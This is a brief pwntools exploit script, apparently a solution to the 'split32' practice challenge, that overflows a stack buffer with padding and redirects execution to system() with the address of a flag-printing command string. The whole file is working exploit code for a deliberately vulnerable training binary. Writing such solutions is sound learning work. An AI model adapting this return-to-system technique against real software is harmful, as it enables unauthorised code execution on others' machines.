from pwn import *

p = process('./split32')
elf = ELF('./split32')

system_addr = elf.plt['system'] 
#system_addr = 0x08048430
cat_flag_addr = 0x0804a030
pad = 'A'*44

print hex(system_addr)
payload = pad+p32(system_addr)+'BBBB'+p32(cat_flag_addr)

p.sendline(payload)
p.interactive() 


